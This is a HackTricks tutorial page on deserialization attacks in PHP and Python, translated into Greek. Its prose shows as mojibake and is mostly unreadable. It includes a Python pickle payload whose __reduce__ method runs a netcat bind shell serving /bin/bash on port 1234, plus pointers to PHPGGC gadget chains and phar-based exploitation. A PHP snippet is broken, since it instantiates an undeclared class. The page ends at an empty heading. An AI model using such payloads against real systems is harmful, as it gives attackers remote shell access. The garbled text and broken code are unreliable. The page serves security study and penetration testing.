# Deserialization

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

**Serialization** ÎºÎ±Ï„Î±Î½Î¿ÎµÎ¯Ï„Î±Î¹ Ï‰Ï‚ Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ Î¼ÎµÏ„Î±Ï„ÏÎ¿Ï€Î®Ï‚ ÎµÎ½ÏŒÏ‚ Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… ÏƒÎµ Î¼Î¹Î± Î¼Î¿ÏÏ†Î® Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¹Î±Ï„Î·ÏÎ·Î¸ÎµÎ¯, Î¼Îµ ÏƒÎºÎ¿Ï€ÏŒ ÎµÎ¯Ï„Îµ Ï„Î·Î½ Î±Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ· Ï„Î¿Ï… Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… ÎµÎ¯Ï„Îµ Ï„Î· Î¼ÎµÏ„Î¬Î´Î¿ÏƒÎ® Ï„Î¿Ï… Ï‰Ï‚ Î¼Î­ÏÎ¿Ï‚ Î¼Î¹Î±Ï‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±Ï‚ ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î±Ï‚. Î‘Ï…Ï„Î® Î· Ï„ÎµÏ‡Î½Î¹ÎºÎ® Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î³Î¹Î± Î½Î± Î´Î¹Î±ÏƒÏ†Î±Î»Î¹ÏƒÏ„ÎµÎ¯ ÏŒÏ„Î¹ Ï„Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Î½Î±Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸ÎµÎ¯ Î±ÏÎ³ÏŒÏ„ÎµÏÎ±, Î´Î¹Î±Ï„Î·ÏÏÎ½Ï„Î±Ï‚ Ï„Î· Î´Î¿Î¼Î® ÎºÎ±Î¹ Ï„Î·Î½ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï„Î¿Ï….

**Deserialization**, Î±Î½Ï„Î¯Î¸ÎµÏ„Î±, ÎµÎ¯Î½Î±Î¹ Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Ï€Î¿Ï… Î±Î½Ï„ÎµÎ½Î´ÏÎ¬ ÏƒÏ„Î· serialization. Î ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î· Î»Î®ÏˆÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ Î´Î¿Î¼Î·Î¸ÎµÎ¯ ÏƒÎµ Î¼Î¹Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î· Î¼Î¿ÏÏ†Î® ÎºÎ±Î¹ Ï„Î·Î½ Î±Î½Î±ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…Î® Ï„Î¿Ï…Ï‚ Ï€Î¯ÏƒÏ‰ ÏƒÎµ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿.

Î— deserialization Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¹ÎºÎ¯Î½Î´Ï…Î½Î· ÎµÏ€ÎµÎ¹Î´Î® **ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿Ï…Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…Ï‚ Î½Î± Ï‡ÎµÎ¹ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ Ï„Î± serialized Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î½ ÎµÏ€Î¹Î²Î»Î±Î²Î® ÎºÏÎ´Î¹ÎºÎ±** Î® Î½Î± Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎ¿Ï…Î½ Î±Ï€ÏÎ¿ÏƒÎ´ÏŒÎºÎ·Ï„Î· ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬ ÏƒÏ„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î® ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± Ï„Î·Ï‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±Ï‚ Î±Î½Î±ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…Î®Ï‚ Ï„Î¿Ï… Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï….

## PHP

Î£Ï„Î·Î½ PHP, ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½ÎµÏ‚ Î¼Î±Î³Î¹ÎºÎ­Ï‚ Î¼Î­Î¸Î¿Î´Î¿Î¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± Ï„Ï‰Î½ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¹ÏÎ½ serialization ÎºÎ±Î¹ deserialization:

* `__sleep`: ÎšÎ±Î»ÎµÎ¯Ï„Î±Î¹ ÏŒÏ„Î±Î½ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± serialization. Î‘Ï…Ï„Î® Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹ Î­Î½Î±Î½ Ï€Î¯Î½Î±ÎºÎ± Î¼Îµ Ï„Î± Î¿Î½ÏŒÎ¼Î±Ï„Î± ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ Î¹Î´Î¹Î¿Ï„Î®Ï„Ï‰Î½ Ï„Î¿Ï… Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Ï€Î¿Ï… Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± serialized. Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î³Î¹Î± Î½Î± Î´ÎµÏƒÎ¼ÎµÏÏƒÎµÎ¹ ÎµÎºÎºÏÎµÎ¼Î® Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î® Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Ï€Î±ÏÏŒÎ¼Î¿Î¹ÎµÏ‚ ÎµÏÎ³Î±ÏƒÎ¯ÎµÏ‚ ÎºÎ±Î¸Î±ÏÎ¹ÏƒÎ¼Î¿Ï.
* `__wakeup`: ÎšÎ±Î»ÎµÎ¯Ï„Î±Î¹ ÏŒÏ„Î±Î½ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± deserialization. Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎµÎ¹ Î¿Ï€Î¿Î¹ÎµÏƒÎ´Î®Ï€Î¿Ï„Îµ ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹Ï‚ Î²Î¬ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡Î¿Ï…Î½ Ï‡Î±Î¸ÎµÎ¯ ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± Ï„Î·Ï‚ serialization ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¬Î»Î»ÎµÏ‚ ÎµÏÎ³Î±ÏƒÎ¯ÎµÏ‚ ÎµÏ€Î±Î½Î±ÏÏ‡Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚.
* `__unserialize`: Î‘Ï…Ï„Î® Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ Î±Î½Ï„Î¯ Ï„Î·Ï‚ `__wakeup` (Î±Î½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹) ÏŒÏ„Î±Î½ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± deserialization. Î Î±ÏÎ­Ï‡ÎµÎ¹ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ· Î­Î»ÎµÎ³Ï‡Î¿ ÏƒÏ„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± deserialization ÏƒÎµ ÏƒÏÎ³ÎºÏÎ¹ÏƒÎ· Î¼Îµ Ï„Î·Î½ `__wakeup`.
* `__destruct`: Î‘Ï…Ï„Î® Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ ÏŒÏ„Î±Î½ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Ï€ÏÏŒÎºÎµÎ¹Ï„Î±Î¹ Î½Î± ÎºÎ±Ï„Î±ÏƒÏ„ÏÎ±Ï†ÎµÎ¯ Î® ÏŒÏ„Î±Î½ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Ï„ÎµÎ»ÎµÎ¹ÏÎ½ÎµÎ¹. Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î³Î¹Î± ÎµÏÎ³Î±ÏƒÎ¯ÎµÏ‚ ÎºÎ±Î¸Î±ÏÎ¹ÏƒÎ¼Î¿Ï, ÏŒÏ€Ï‰Ï‚ Ï„Î¿ ÎºÎ»ÎµÎ¯ÏƒÎ¹Î¼Î¿ Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÏÎ½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½ Î® ÏƒÏ…Î½Î´Î­ÏƒÎµÏ‰Î½ Î²Î¬ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½.
* `__toString`: Î‘Ï…Ï„Î® Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Î½Î± Î±Î½Ï„Î¹Î¼ÎµÏ„Ï‰Ï€Î¯Î¶ÎµÏ„Î±Î¹ Ï‰Ï‚ ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬. ÎœÏ€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Ï„Î·Î½ Î±Î½Î¬Î³Î½Ï‰ÏƒÎ· ÎµÎ½ÏŒÏ‚ Î±ÏÏ‡ÎµÎ¯Î¿Ï… Î® Î¬Î»Î»Ï‰Î½ ÎµÏÎ³Î±ÏƒÎ¹ÏÎ½ Î¼Îµ Î²Î¬ÏƒÎ· Ï„Î¹Ï‚ ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½ Î¼Î­ÏƒÎ± ÏƒÎµ Î±Ï…Ï„ÏŒ, Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Ï‚ Î±Ï€Î¿Ï„ÎµÎ»ÎµÏƒÎ¼Î±Ï„Î¹ÎºÎ¬ Î¼Î¹Î± ÎºÎµÎ¹Î¼ÎµÎ½Î¹ÎºÎ® Î±Î½Î±Ï€Î±ÏÎ¬ÏƒÏ„Î±ÏƒÎ· Ï„Î¿Ï… Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï….
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Î‘Î½ ÎºÎ¿Î¹Ï„Î¬Î¾ÎµÏ„Îµ Ï„Î± Î±Ï€Î¿Ï„ÎµÎ»Î­ÏƒÎ¼Î±Ï„Î±, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Î¿Î¹ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ **`__wakeup`** ÎºÎ±Î¹ **`__destruct`** ÎºÎ±Î»Î¿ÏÎ½Ï„Î±Î¹ ÏŒÏ„Î±Î½ Ï„Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Î±Ï€Î¿Î´Î¿Î¼Î·Î¸ÎµÎ¯. Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ ÏƒÎµ Ï€Î¿Î»Î»Î­Ï‚ Î¿Î´Î·Î³Î¯ÎµÏ‚ Î¸Î± Î²ÏÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· **`__toString`** ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ ÏŒÏ„Î±Î½ Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÏ„Ï…Ï€ÏÏƒÎµÏ„Îµ ÎºÎ¬Ï€Î¿Î¹Î± Î¹Î´Î¹ÏŒÏ„Î·Ï„Î±, Î±Î»Î»Î¬ Ï€ÏÎ¿Ï†Î±Î½ÏÏ‚ Î±Ï…Ï„ÏŒ **Î´ÎµÎ½ ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ Ï€Î¹Î±**.

{% hint style="warning" %}
Î— Î¼Î­Î¸Î¿Î´Î¿Ï‚ **`__unserialize(array $data)`** ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ **Î±Î½Ï„Î¯ Î³Î¹Î± `__wakeup()`** Î±Î½ Î­Ï‡ÎµÎ¹ Ï…Î»Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ ÏƒÏ„Î·Î½ ÎºÎ»Î¬ÏƒÎ·. Î£Î±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± Î±Ï€Î¿Î´Î¿Î¼Î®ÏƒÎµÏ„Îµ Ï„Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Ï‚ Ï„Î± ÏƒÎµÎ¹ÏÎ¹Î±ÏƒÎ¼Î­Î½Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï‰Ï‚ Ï€Î¯Î½Î±ÎºÎ±. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î±Ï…Ï„Î® Ï„Î· Î¼Î­Î¸Î¿Î´Î¿ Î³Î¹Î± Î½Î± Î±Ï€Î¿Î´Î¿Î¼Î®ÏƒÎµÏ„Îµ Î¹Î´Î¹ÏŒÏ„Î·Ï„ÎµÏ‚ ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î¿Ï€Î¿Î¹ÎµÏƒÎ´Î®Ï€Î¿Ï„Îµ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„ÎµÏ‚ ÎµÏÎ³Î±ÏƒÎ¯ÎµÏ‚ ÎºÎ±Ï„Î¬ Ï„Î·Î½ Î±Ï€Î¿Î´ÏŒÎ¼Î·ÏƒÎ·.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ Î­Î½Î± ÎµÎ¾Î·Î³Î·Î¼Î­Î½Î¿ **Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± PHP ÎµÎ´Ï**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), ÎµÎ´Ï [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) Î® ÎµÎ´Ï [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± autoload Ï„Î¿Ï… PHP Î³Î¹Î± Î½Î± Ï†Î¿ÏÏ„ÏÏƒÎµÏ„Îµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î± Î±ÏÏ‡ÎµÎ¯Î± php ÎºÎ±Î¹ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ±:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Serializing Referenced Values

Î‘Î½ Î³Î¹Î± ÎºÎ¬Ï€Î¿Î¹Î¿ Î»ÏŒÎ³Î¿ Î¸Î­Î»ÎµÏ„Îµ Î½Î± ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î¼Î¹Î± Ï„Î¹Î¼Î® Ï‰Ï‚ **Î±Î½Î±Ï†Î¿ÏÎ¬ ÏƒÎµ Î¬Î»Î»Î· Ï„Î¹Î¼Î® Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÎ±Ï‚ Î²Î¿Î·Î¸Î®ÏƒÎµÎ¹ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ payloads Î³Î¹Î± Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î¹Ï‚ PHP deserializations.\
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ ÏƒÎµ Ï€Î¿Î»Î»Î­Ï‚ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ **Î´ÎµÎ½ Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î±Î½ Ï„ÏÏŒÏ€Î¿ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î¼Î¹Î± deserialization ÏƒÏ„Î¿Î½ Ï€Î·Î³Î±Î¯Î¿ ÎºÏÎ´Î¹ÎºÎ±** Ï„Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚, Î±Î»Î»Î¬ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÏÎ½ PHP ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎµÏ‰Î½.**\
ÎˆÏ„ÏƒÎ¹, Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ, ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î¿ `phpinfo()` Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® ÎºÎ±Î¹ **Î±Î½Î±Î¶Î·Ï„Î®ÏƒÏ„Îµ ÏƒÏ„Î¿ Î´Î¹Î±Î´Î¯ÎºÏ„Ï…Î¿** (Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ ÏƒÏ„Î± **gadgets** Ï„Î¿Ï… **PHPGGC**) ÎºÎ¬Ï€Î¿Î¹Î± Ï€Î¹Î¸Î±Î½Î¬ gadgets Ï€Î¿Ï… Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ.

### phar:// metadata deserialization

Î‘Î½ Î­Ï‡ÎµÏ„Îµ Î²ÏÎµÎ¹ Î­Î½Î± LFI Ï€Î¿Ï… Î±Ï€Î»ÏÏ‚ Î´Î¹Î±Î²Î¬Î¶ÎµÎ¹ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ ÎºÎ±Î¹ Î´ÎµÎ½ ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î¿Î½ php ÎºÏÎ´Î¹ÎºÎ± Î¼Î­ÏƒÎ± ÏƒÎµ Î±Ï…Ï„ÏŒ, Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ ÏŒÏ€Ï‰Ï‚ _**file\_get\_contents(), fopen(), file() Î® file\_exists(), md5\_file(), filemtime() Î® filesize()**_**.** ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î¼Î¹Î± **deserialization** Ï€Î¿Ï… ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î±Î½ **Î´Î¹Î±Î²Î¬Î¶ÎµÏ„Îµ** Î­Î½Î± **Î±ÏÏ‡ÎµÎ¯Î¿** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ **phar** Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î¿.\
Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î´Î¹Î±Î²Î¬ÏƒÏ„Îµ Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î±Î½Î¬ÏÏ„Î·ÏƒÎ·:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

ÎŒÏ„Î±Î½ Ï„Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Î±Ï€Î¿ÏƒÏ…Î¼Ï€Î¹Î­Î¶ÎµÏ„Î±Î¹, Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· _\_\_reduce\_\__ Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯.\
ÎŒÏ„Î±Î½ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯, Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ Î­Î½Î± ÏƒÏ†Î¬Î»Î¼Î±.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Î ÏÎ¹Î½ ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î·Î½ Ï„ÎµÏ‡Î½Î¹ÎºÎ® Ï€Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ·Ï‚, Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÏ„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ `print(base64.b64encode(pickle.dumps(P(),2)))` Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î¼Î²Î±Ï„ÏŒ Î¼Îµ python2 Î±Î½ Ï„ÏÎ­Ï‡ÎµÏ„Îµ python3.

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î·Î½ Î±Ï€Î¿Ï†Ï…Î³Î® Î±Ï€ÏŒ **pickle jails** ÎµÎ»Î­Î³Î¾Ï„Îµ:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

